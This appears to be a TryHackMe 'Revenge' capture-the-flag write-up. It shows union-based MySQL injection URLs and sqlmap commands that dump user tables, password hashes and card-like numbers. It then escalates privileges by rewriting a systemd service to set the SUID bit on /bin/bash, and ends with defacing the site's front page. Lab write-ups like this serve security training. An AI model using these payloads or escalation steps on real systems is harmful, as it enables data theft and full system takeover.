# 42 - Revenge (MySQL Injection)

Room Link --> [https://tryhackme.com/room/revenge](https://tryhackme.com/room/revenge)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
```
{% endcode %}

After Navigating round the entire page, there is a `/products` page that is vulnerable to SQL injection.

If you navigate to a page that dosen't exist, it displays an error.&#x20;

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Number of Columns

`http://10.10.157.23/products/5 UNION SELECT 1,2,3,4,5,6,7,8-- -` - there are 8 columns, if you enter `9` you get an error, and again we see that both columns 8 and 2 are visible so we can output our queries from either of them.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Current User of the DB

`http://10.10.157.23/products/5%20UNION%20SELECT%201,current_user(),3,4,5,6,7,8`

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Its the root user.

### Schema/DB Name

`http://10.10.157.23/products/5%20UNION%20SELECT%201,database(),3,4,5,6,7,8`&#x20;

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Or we can do the below to dump all schemas/dbs**

`http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(schema_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.SCHEMATA` - or we can use the "JSON\_ARRAYAGG" with the "CONCAT" function to view all DB/Schema names.

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Table Name

`http://10.10.157.23/products/5 UNION SELECT 1,CONCAT(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema="duckyinc"` -&#x20;

Table name is --> product

**Or we can do the below to dump all tables in the "duckyinc" schema/db**

`http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(table_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema="duckyinc"`&#x20;

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Columns in Table

`http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(column_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="product"`&#x20;

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now:

Under the \`system\_user" Table, these are the columns:

`http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(column_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="system_user"` .

{% code lineNumbers="true" %}
```bash
["id", "username", "_password", "email"]
```
{% endcode %}

Under the "user" Table, there are many columns here:

`http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(column_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="system_user"` .

{% code overflow="wrap" lineNumbers="true" %}
```bash
["id", "username", "_password", "credit_card", "email", "company", "Host", "User", "Select_priv", "Insert_priv", "Update_priv", "Delete_priv", "Create_priv", "Drop_priv", "Reload_priv", "Shutdown_priv", "Process_priv", "File_priv", "Grant_priv", "References_priv", "Index_priv", "Alter_priv", "Show_db_priv", "Super_priv", "Create_tmp_table_priv", "Lock_tables_priv", "Execute_priv", "Repl_slave_priv", "Repl_client_priv", "Create_view_priv", "Show_view_priv", "Create_routine_priv", "Alter_routine_priv", "Create_user_priv", "Event_priv", "Trigger_priv", "Create_tablespace_priv", "ssl_type", "ssl_cipher", "x509_issuer", "x509_subject", "max_questions", "max_updates", "max_connections", "max_user_connections", "plugin", "authentication_string", "password_expired", "password_last_changed", "password_lifetime", "account_locked"]
```
{% endcode %}

But the "username, password, creditcard" are what we need to check out.

### Dump Data

We can use the `LIMIT` statement to view all the data one by one.

**1st row**

`http://10.10.157.23/products/5 UNION SELECT 1,CONCAT(id,"-",username,"-",_password,"-",email),3,4,5,6,7,8 FROM system_user LIMIT 0,1` .

<figure><img src=".gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**2nd row**

`http://10.10.157.23/products/5 UNION SELECT 1,CONCAT(id,"-",username,"-",_password,"-",email),3,4,5,6,7,8 FROM system_user LIMIT 1,1`

<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code lineNumbers="true" %}
```bash
1-server-admin-$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a-sadmin@duckyinc.org
2-kmotley-$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa-kmotley@duckyinc.org
3-dhughes-$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK-dhughes@duckyinc.org

```
{% endcode %}

### Using Sqlmap

{% code lineNumbers="true" %}
```bash
# dump the dbs/schemas
sqlmap 10.10.157.23/products/1 --batch --dbs

# dump tables for the "duckyinc" schema/db.
sqlmap 10.10.157.23/products/1 --batch -D duckyinc --tables

# dump the data.
sqlmap 10.10.157.23/products/1 --batch -D duckyinc -T user --dump


# output
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
```
{% endcode %}

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>The flag is also here.</p></figcaption></figure>

### Initial Access

#### Moving forward to Cracking the hashes.

<figure><img src=".gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

The password for the `server-admin` was cracked successfully.

<figure><img src=".gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

`sudo -l` .

<figure><img src=".gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

We can modify the "duckyinc.service" file as root.

We can modify this service to our own vulnerable version which will give us a root shell. This will give `/bin/bash` a SUID bit set.

```bash
# edit the service file to:
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target

# after editing the file.
server-admin@duckyinc:~$ sudo -u root /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo -u root /bin/systemctl restart duckyinc.service
server-admin@duckyinc:~$ ls -l /bin/bash 
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

<figure><img src=".gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

And we are root:

<figure><img src=".gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

But if we see, we do not have the root flag in `/root` directory. We know from the note we got that we need to deface the front page in order to complete the challenge.

If we check the root dir, we can see a `.vininfo` file, making reference to a `/var/www/duckyinc/templates/index.html` - this is the index page of the company website.

```
nano /var/www/duckyinc/templates/index.html
```

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-qYnnkX3DZIE/X6_mk-ogPfI/AAAAAAAAqqM/627nZBkUVp8n9p-_OWj3vwM7W2xwa5tKACLcBGAsYHQ/s16000/16.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

We list the directory again and now we can read the last flag.

<figure><img src=".gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

Done!

